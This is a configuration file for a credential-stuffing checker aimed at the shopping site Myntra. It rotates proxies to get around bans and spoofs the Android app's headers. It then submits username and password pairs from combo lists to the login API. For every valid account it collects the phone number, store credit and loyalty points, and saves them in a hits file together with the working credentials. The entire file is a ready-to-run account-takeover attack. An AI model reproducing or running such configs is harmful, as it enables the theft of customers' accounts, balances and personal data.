[General]
UseProxy = true
UseGlobalKeywords = True
DefaultTimeout = 20
UnbanAllProxiesWhenAllBannedAfter = 2
HitsFolderName = Myntra
AutoUpdateProxies = SOCKS5|HTTP
Debug = True

[Stage-1]

Variable-* = $DeviceID = generate("DeviceID")
Variable-* = $installationID = generate("UUID","TRUE")
Variable-* = $sessionID = generate("UUID","TRUE")
Variable-* = $myntraid = generate("UUID","TRUE")
Variable-* = $Head = combinetext("User-Agent: Mozilla/5.0 (Linux; Android 4.4.2; LGM-V300K Build/N2G47H) AppleWebKit/537.36 (KHTMLchr(Comma) like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36; MyntraRetailAndroid/3.32.0 (Phonechr(Comma) 240dpi); MyntraAndroid/3.32.0 (Phonechr(Comma) 240dpi); api;\nIGNORE-REFRESH: true\nX-SLOT-MODE: disabled\nX-MYNTRA-APP: appFamily=MyntraRetailAndroid; appVersion=3.32.0; appBuild=80110243; deviceCategory=Phone; osVersion=4.4.2; sdkVersion=19; deviceID=",$DeviceID#,"; installationID=",$installationID#,"; sessionID=",$sessionID#,";advertisingID=0;advertisingIDKeySpace=GAID;bundleVersion=1.0.0;\nx-device-state: connectionClass=UNKNOWN; connectionType=WIFI; bandwidth=-1.0; deviceYear=2013; deviceYearType=2;\nclientid: myntra-02d7dec5-8a00-4c74-9cf7-9d62dbea5e61")
Variable-* = $At = findtagval($stage1responseHeader#,"At: ","\n")
Variable-* = $Xid = findtagval($stage1responseHeader#,"Xid: ","\n")

Condition = Any
Link = https://api.myntra.com/auth/v1/token
isFTP = False
HTTPVersion = 1.1
FollowRedirect = True
HTTPRequestMethod = GET
Headers = $Head#

Ban-Condition = (Contains($stage1responseHeader#,"1","HTTP/1.1 403 Forbidden","HTTP/1.1 504 Gateway Timeout","HTTP/1.1 503 Service Unavailable")) || (NotContains($stage1responseHeader#,"1","At: "))

[Stage-2]
Variable-* = $Head2 = combinetext("User-Agent: Mozilla/5.0 (Linux; Android 4.4.2; LGM-V300K Build/N2G47H) AppleWebKit/537.36 (KHTMLchr(Comma) like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36; MyntraRetailAndroid/3.32.0 (Phonechr(Comma) 240dpi); MyntraAndroid/3.32.0 (Phonechr(Comma) 240dpi); api;\nIGNORE-REFRESH: true\nX-SLOT-MODE: disabled\nX-MYNTRA-APP: appFamily=MyntraRetailAndroid; appVersion=3.32.0; appBuild=80110243; deviceCategory=Phone; osVersion=4.4.2; sdkVersion=19; deviceID=",$DeviceID#,"; installationID=",$installationID#,"; sessionID=",$sessionID#,";advertisingID=0;advertisingIDKeySpace=GAID;bundleVersion=1.0.0;\nx-device-state: connectionClass=UNKNOWN; connectionType=WIFI; bandwidth=-1.0; deviceYear=2013; deviceYearType=2;")
Variable-* = $xbuCookie = findtagval($stage2responseHeader#,"Set-Cookie: xbu=",";")
Variable-* = $xtpCookie = findtagval($stage2responseHeader#,"Set-Cookie: xtp=",";")

Condition = len($At#) >= 1
Link = https://developer.myntra.com/notifications/schedule
isFTP = False
HTTPVersion = 1.1
FollowRedirect = True
HTTPRequestMethod = GET
Headers = $Head2#

Ban-Condition = (Contains($stage2responseHeader#,"1","HTTP/1.1 403 Forbidden","HTTP/1.1 504 Gateway Timeout","HTTP/1.1 503 Service Unavailable"))

[Stage-3]
Variable-* = $Head3 = combinetext("xid: ",$Xid#,"\nat: ",$At#,"\nUser-Agent: Mozilla/5.0 (Linux; Android 4.4.2; LGM-V300K Build/N2G47H) AppleWebKit/537.36 (KHTMLchr(Comma) like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36; MyntraRetailAndroid/3.32.0 (Phonechr(Comma) 240dpi); MyntraAndroid/3.32.0 (Phonechr(Comma) 240dpi); api;\nIGNORE-REFRESH: true\nX-SLOT-MODE: disabled\nX-MYNTRA-APP: appFamily=MyntraRetailAndroid; appVersion=3.32.0; appBuild=80110243; deviceCategory=Phone; osVersion=4.4.2; sdkVersion=19; deviceID=",$DeviceID#,"; installationID=",$installationID#,"; sessionID=",$sessionID#,";advertisingID=0;advertisingIDKeySpace=GAID;bundleVersion=1.0.0;\nX-MYNTRA-ABTEST: 140=27; 143=144; 165=27; 170=27; 171=344; 187=27; 194=5; 210=27; 212=8; 217=27; 238=373; 239=26; 254=8; 271=8; 272=8; 275=276; 288=27; 289=290; 292=27; 308=26; 32=26; 320=27; 336=27; 341=27; 343=26; 346=27; 348=27; 354=27; 356=281; 357=27; 358=7; 365=26; 369=27; 375=27; 376=27; 377=5; 379=26; 40=5; 68=27; 87=27; address.v2=enabled; android.helpshift=enabled; android.looksoms=flatshots; config.bucket=regular; ios.profile.fab=default; lgp.rollout=enabled; lgp.timeline.cardloadevent=enabled; list.interactive.variant=default; mymyntra.armor=enabled; nav.guided=enabled; nav.links=store; nav.store=disabled; pdp.android.react=disabled; pdp.android.react.v1=enabled; pdp.details=table; pdp.forum=enabled; pdp.video=disabled; pps=enabled; rn.update=default; search.additionalInfo=test; search.sampling=enabled; search.visual=enabled; shortlist.list.click=default; wallet=enabled\nx-device-state: connectionClass=UNKNOWN; connectionType=WIFI; bandwidth=-1.0; deviceYear=2013; deviceYearType=2;\nuser-state: UNKNOWN\nContent-Type: application/json; charset=UTF-8")
Variable-* = $PostData = combinetext("{chr(double quotes)accessKeychr(double quotes):chr(double quotes)",$ComboPassword#,"chr(double quotes)chr(Comma)chr(double quotes)userIdchr(double quotes):chr(double quotes)",$ComboUsername#,"chr(double quotes)}")
Variable-* = $uidx = findtagval($stage3responseSource#,"chr(double quotes)uidxchr(double quotes):chr(double quotes)","chr(double quotes)")
Variable-* = $Phone = findtagval($stage3responseSource#,"chr(double quotes)phonechr(double quotes):chr(double quotes)","chr(double quotes)")
Variable-* = $AtCookie = findtagval($stage3responseHeader#,"At: ","\n")
Variable-* = $RtCookie = findtagval($stage3responseHeader#,"Rt: ","\n")
Variable-* = $SxidCookie = findtagval($stage3responseHeader#,"Sxid: ","\n")

Condition = len($At#) >= 1
Link = https://api.myntra.com/auth/v1/login
isFTP = False
HTTPVersion = 1.1
FollowRedirect = false
HTTPRequestMethod = Post
PostContent = $PostData#
Headers = $Head3#

Failure-Condition = (Contains($stage3responseSource#,"1","Oops. That failed. Try again later!","Incorrect user id or password","chr(double quotes)Account does not existchr(double quotes)","Enter a valid email","Your account is locked. Contact customer care")) || (Contains($stage3responseHeader#,"1","HTTP/1.1 400 Bad Request"))
Ban-Condition = (Contains($stage3responseHeader#,"1","HTTP/1.1 403 Forbidden","HTTP/1.1 504 Gateway Timeout","HTTP/1.1 503 Service Unavailable")) || (Contains($stage3responseHeader#,"1","HTTP/1.1 504 Gateway Timeout"))

[Stage-4]
Variable-* = $advertisingID = generate("UUID","TRUE")
Variable-* = $Head4 = combinetext("xid: ",$xid#,"\nat: ",$At#,"\nUser-Agent: Mozilla/5.0 (Linux; Android 4.4.2; LGM-V300K Build/N2G47H) AppleWebKit/537.36 (KHTMLchr(Comma) like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36; MyntraRetailAndroid/3.32.0 (Phonechr(Comma) 240dpi); MyntraAndroid/3.32.0 (Phonechr(Comma) 240dpi); api;\nIGNORE-REFRESH: true\nX-SLOT-MODE: disabled\nX-MYNTRA-APP: appFamily=MyntraRetailAndroid; appVersion=3.32.0; appBuild=80110243; deviceCategory=Phone; osVersion=4.4.2; sdkVersion=19; deviceID=",$DeviceID#,"; installationID=",$installationID#,"; sessionID=",$sessionID#,";customerID=",$xid#,";advertisingID=",$advertisingID#,";advertisingIDKeySpace=GAID;bundleVersion=1.10.3;\nX-MYNTRA-ABTEST: 140=27; 143=144; 165=27; 170=27; 171=344; 187=27; 194=5; 210=27; 212=8; 217=27; 238=373; 239=26; 254=8; 271=8; 272=8; 275=276; 288=27; 289=290; 292=27; 308=26; 32=26; 320=27; 336=27; 341=27; 343=26; 346=27; 348=27; 354=27; 356=281; 357=27; 358=7; 365=26; 369=27; 375=27; 376=27; 377=5; 379=26; 40=5; 68=27; 87=27; address.v2=enabled; android.helpshift=enabled; android.looksoms=flatshots; config.bucket=regular; ios.profile.fab=default; lgp.rollout=enabled; lgp.timeline.cardloadevent=enabled; list.interactive.variant=default; mymyntra.armor=enabled; nav.guided=enabled; nav.links=store; nav.store=disabled; pdp.android.react=disabled; pdp.android.react.v1=enabled; pdp.details=table; pdp.forum=enabled; pdp.video=disabled; pps=enabled; rn.update=default; search.additionalInfo=test; search.sampling=enabled; search.visual=enabled; shortlist.list.click=default; wallet=enabled\nx-device-state: connectionClass=UNKNOWN; connectionType=WIFI; bandwidth=-1.0; deviceYear=2013; deviceYearType=2;\nuser-state: UNKNOWN")
Variable-* = $activePoints = findtagval($stage4responseSource#,"chr(double quotes)activePointschr(double quotes):","chr(Comma)chr(double quotes)")

Condition = len($uidx#) >= 1
Link = https://api.myntra.com/user/v1/loyaltypoints
isFTP = False
HTTPVersion = 1.1
FollowRedirect = True
HTTPRequestMethod = GET
Headers = $Head4#

Ban-Condition = (Contains($stage4responseHeader#,"1","HTTP/1.1 403 Forbidden","HTTP/1.1 504 Gateway Timeout","HTTP/1.1 503 Service Unavailable"))

[Stage-5]
Variable-* = $insiderPointsvar = findtagval($stage5responseSource#,"loyaltyPointschr(double quotes):","chr(Comma)chr(double quotes)")
Variable-* = $insiderPoints = if(len($insiderPointsvar#) >= 1,$insiderPointsvar#,"0")
Condition = len($uidx#) >= 1
Link = https://www.myntra.com/myntrainsider/proxy/styleplusapi/user/exists
isFTP = False
HTTPVersion = 1.1
FollowRedirect = True
HTTPRequestMethod = GET
Headers = $Head4#

Ban-Condition = (Contains($stage5responseHeader#,"1","HTTP/1.1 403 Forbidden","HTTP/1.1 504 Gateway Timeout","HTTP/1.1 503 Service Unavailable"))
Retry-Condition = (Contains($stage5responseSource#,"1","<meta http-equiv=chr(double quotes)Content-Typechr(double quotes) content=chr(double quotes)text/html; charset=utf-8chr(double quotes) />"))

[Stage-6]
Variable-* = $advertisingID = generate("UUID","TRUE")
Variable-* = $Head5 = combinetext("x-device-state: connectionClass=UNKNOWN; connectionType=WIFI; bandwidth=-1.0; deviceYear=2013; deviceYearType=2;\nAccept: text/htmlchr(Comma)application/xhtml+xmlchr(Comma)application/xml;q=0.9chr(Comma)image/webpchr(Comma)*/*;q=0.8\nx-myntra-app: appFamily=MyntraRetailAndroid; appVersion=3.32.0; appBuild=80110243; deviceCategory=Phone; osVersion=5.5.1; sdkVersion=23; deviceID=",$DeviceID#,"; installationID=",$installationID#,"; sessionID=",$sessionID#,";customerID=",$uidx#,";advertisingID=",$advertisingID#,";advertisingIDKeySpace=GAID;bundleVersion=1.10.3;\nUser-Agent: Mozilla/5.0 (Linux; Android 5.5.1; LGM-V300K Build/N2G47H) AppleWebKit/537.36 (KHTMLchr(Comma) like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36; MyntraRetailAndroid/3.32.0 (Phonechr(Comma) 240dpi); MyntraAndroid/3.32.0 (Phonechr(Comma) 240dpi)\nAccept-Language: en-RUchr(Comma)en-US;q=0.8\nX-Requested-With: com.myntra.android\ncookie: xid=",$xid#,"; sxid=",$SxidCookie#,"; rt=",$RtCookie#,"; at=",$AtCookie#,"; xtp=",$xtpCookie#,"; phone_pe_sdk_version=phone_pe_sdk_version/0.3.2&app_version/3.32.0; _x_myntra_initial_url=https://www.myntra.com/my/myntracredit")
Variable-* = $Credit = findtagval($stage6responseSource#,"chr(double quotes)totalBalancechr(double quotes):","chr(Comma)chr(double quotes)")
Variable-* = $SaveFormat = combinetext($ComboUsername#,":",$ComboPassword#,"\nPhone: ",$Phone#," | Credit: ",$Credit#," | Active Points: ",$activePoints#," | Insider Points: ",$insiderPoints#,"\n")
Variable-* = $Crdcheck = (Contains($stage6responseSource#,"1","chr(double quotes)totalBalancechr(double quotes):0chr(Comma)chr(double quotes)"))
Variable-* = $activePointscheck = (Contains($stage4responseSource#,"1","chr(double quotes)activePointschr(double quotes):0chr(Comma)chr(double quotes)"))
Variable-* = $insiderPointscheck = (Contains($stage5responseSource#,"1","loyaltyPointschr(double quotes):0chr(Comma)chr(double quotes)")) || (Contains($stage5responseSource#,"1","{chr(double quotes)errorchr(double quotes):chr(double quotes)Invalid User idchr(double quotes)}")) || (NotContains($stage5responseSource#,"1","loyaltyPoints"))

Condition = len($uidx#) >= 1
Link = https://www.myntra.com/my/myntracredit
isFTP = False
HTTPVersion = 1.1
FollowRedirect = True
HTTPRequestMethod = GET
Headers = $Head5#

Retry-Condition = (Contains($stage6responseHeader#,"1","HTTP/1.1 504 Gateway Time-out")) || (Contains($stage6responseSource#,"1","<meta http-equiv=chr(double quotes)Content-Typechr(double quotes) content=chr(double quotes)text/html; charset=utf-8chr(double quotes) />"))
Free-Condition = (Contains($stage6responseSource#,"1","<title>Myntra Credit</title>")) && $Crdcheck# && $activePointscheck# && $insiderPointscheck#
Ban-Condition = (Contains($stage6responseHeader#,"1","HTTP/1.1 403 Forbidden","HTTP/1.1 504 Gateway Timeout","HTTP/1.1 503 Service Unavailable"))
Success-Condition = (Contains($stage6responseSource#,"1","<title>Myntra Credit</title>")) && (((NotContains($stage5responseSource#,"1","loyaltyPointschr(double quotes):0chr(Comma)chr(double quotes)")) && (Contains($stage5responseSource#,"1","loyaltyPoints")) && (NotContains($stage5responseSource#,"1","{chr(double quotes)errorchr(double quotes):chr(double quotes)Invalid User idchr(double quotes)}"))) || (NotContains($stage6responseSource#,"1","chr(double quotes)totalBalancechr(double quotes):0chr(Comma)chr(double quotes)")) || (NotContains($stage4responseSource#,"1","chr(double quotes)activePointschr(double quotes):0chr(Comma)chr(double quotes)")))